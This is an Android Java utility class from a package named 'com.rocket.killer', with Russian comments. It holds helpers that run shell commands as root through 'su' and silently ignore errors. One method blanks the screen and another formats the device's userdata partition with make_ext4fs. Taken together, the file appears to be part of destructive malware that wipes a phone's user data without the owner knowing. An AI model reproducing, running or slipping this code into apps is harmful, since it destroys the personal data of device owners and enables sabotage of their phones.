package com.rocket.killer;

import java.io.DataOutputStream;
import java.io.File;

public class Utils {

    // Выполнение shell-команд с root-правами
    public static void runAsRoot(String command) {
        try {
            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());
            os.writeBytes(command + "\n");
            os.writeBytes("exit\n");
            os.flush();
            process.waitFor();
        } catch (Exception ignored) {}
    }

    // Отключение экрана (бесконечный сон)
    public static void sleepDevice() {
        runAsRoot("echo 0 > /sys/class/graphics/fb0/blank");
    }

    // Форматирование раздела data
    public static void formatData() {
        runAsRoot("make_ext4fs /dev/block/by-name/userdata");
    }
}